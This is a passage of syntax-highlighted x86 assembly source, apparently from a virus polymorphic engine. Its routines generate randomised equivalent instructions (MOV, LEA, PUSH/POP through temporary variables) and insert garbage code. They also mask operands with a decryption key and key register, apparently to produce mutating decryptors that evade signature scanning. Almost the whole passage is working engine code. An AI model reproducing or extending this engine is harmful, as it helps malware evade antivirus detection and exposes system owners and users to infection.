                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">
        </span><span class="sc5">@@Byte</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">
                
    </span><span class="sc5">@@NoRecursives2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc5">@@NoRecursives</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MOVDirect</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MOVDirect2</span><span class="sc0">

     </span><span class="sc5">@@End</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">S_EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">DoMOVMemValue</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">DoADDMemReg</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OpcodeToUseInXXXFunc</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DoXXXWithMemAndReg</span><span class="sc0">
</span><span class="sc5">DoADDMemReg</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Attention: This routine shouldn't be called directly!</span><span class="sc0">
</span><span class="sc5">DoXXXWithMemAndReg</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Direct</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyIsInit</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Direct</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OpcodeToUseInXXXFunc</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Byte</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF80h</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Byte</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">
      </span><span class="sc5">@@Byte</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">

    </span><span class="sc5">@@Direct</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OpcodeToUseInXXXFunc</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">

      </span><span class="sc5">@@End</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">S_EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">DoXXXWithMemAndReg</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">DoADDRegMem</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OpcodeToUseInXXXFunc</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DoXXXWithMemAndReg</span><span class="sc0">
</span><span class="sc5">DoADDRegMem</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">DoSUBRegMem</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OpcodeToUseInXXXFunc</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2Bh</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DoXXXWithMemAndReg</span><span class="sc0">
</span><span class="sc5">DoSUBRegMem</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">DoSUBMemReg</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OpcodeToUseInXXXFunc</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">29h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DoXXXWithMemAndReg</span><span class="sc0">
</span><span class="sc5">DoSUBMemReg</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">DoXORRegMem</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OpcodeToUseInXXXFunc</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DoXXXWithMemAndReg</span><span class="sc0">
</span><span class="sc5">DoXORRegMem</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">DoXORMemReg</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OpcodeToUseInXXXFunc</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DoXXXWithMemAndReg</span><span class="sc0">
</span><span class="sc5">DoXORMemReg</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">OpcodeToUseInXXXFunc</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">DoADDMemValue</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ADD</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@ADD2</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SUB</span><span class="sc0">
     </span><span class="sc5">@@SUB2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyIsInit</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@SUB</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2881h</span><span class="sc0">
     </span><span class="sc5">DoXXXMemValue_Common2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@SUB2b</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF80h</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@SUB2b</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
     </span><span class="sc5">DoXXXMemValue_Common</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">
       </span><span class="sc5">@@SUB2b</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">
       </span><span class="sc5">@@SUB</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2D81h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DoXXXMemValue_Common</span><span class="sc0">
       </span><span class="sc5">@@ADD</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0581h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DoXXXMemValue_Common</span><span class="sc0">
       </span><span class="sc5">@@ADD2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyIsInit</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@ADD</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0081h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DoXXXMemValue_Common2</span><span class="sc0">

       </span><span class="sc5">@@End</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">S_EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">DoADDMemValue</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">DoSUBMemValue</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoADDMemValue</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">DoSUBMemValue</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">DoXORMemValue</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@XOR</span><span class="sc0">
        </span><span class="sc5">@@XOR2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyIsInit</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@XOR</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3081h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DoXXXMemValue_Common2</span><span class="sc0">
        </span><span class="sc5">@@XOR</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3581h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DoXXXMemValue_Common</span><span class="sc0">
</span><span class="sc5">DoXORMemValue</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function makes code to move the value of one register to another. This</span><span class="sc0">
</span><span class="sc1">;; task can be made with:</span><span class="sc0">
</span><span class="sc1">;; - MOV Reg1,Reg2</span><span class="sc0">
</span><span class="sc1">;; - LEA Reg1,[Reg2]</span><span class="sc0">
</span><span class="sc1">;; - PUSH Reg2/Garbage/POP Reg1</span><span class="sc0">
</span><span class="sc1">;; When calling: DL=Destiny register, DH=Source register</span><span class="sc0">
</span><span class="sc5">DoMOVRegReg</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@NoRecursives</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@PUSHPOP</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@LEA</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MOV</span><span class="sc0">
   </span><span class="sc5">@@MOVMEM</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAndReserveVar</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NoRecursives</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOVMemReg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOVRegMem</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReleaseVar</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">
   </span><span class="sc5">@@PUSHPOP</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoPUSHReg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoPOPReg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">
   </span><span class="sc5">@@LEA</span><span class="sc4">:</span><span class="sc0">       
    </span><span class="sc1">;; Here we make: LEA Reg1,[Reg2]</span><span class="sc0">
    </span><span class="sc1">;; The opcode of instruction LEA is as follows:</span><span class="sc0">
    </span><span class="sc1">;; LEA = 8Dh+ 00(IndexAdding).000(Destiny).000(SourceInBrackets - Not 5)</span><span class="sc0">
    </span><span class="sc1">;;  To put EBP in SourceInBrackets, IndexAdding must be 1 or 2.</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">   </span><span class="sc1">; Prepare the destiny register to set it to</span><span class="sc0">
                                </span><span class="sc1">; the opcode</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">   </span><span class="sc1">; Is the source register EBP?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@LEA_EBP</span><span class="sc0">   </span><span class="sc1">; If it is, jump</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">008Dh</span><span class="sc0"> </span><span class="sc1">; AX=Clean opcode of LEA</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">    </span><span class="sc1">; Set the destiny register</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">    </span><span class="sc1">; Set the register in brackets</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">             </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">       </span><span class="sc1">; Jump to return</span><span class="sc0">
     </span><span class="sc5">@@LEA_EBP</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">458Dh</span><span class="sc0"> </span><span class="sc1">; Opcode of LEA Reg,[EBP+something]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">    </span><span class="sc1">; Set the destiny register</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">             </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">             </span><span class="sc1">; Store a 0 addition</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">       </span><span class="sc1">; Jump to return</span><span class="sc0">

         </span><span class="sc1">;; Make a MOV Reg1,Reg2</span><span class="sc0">
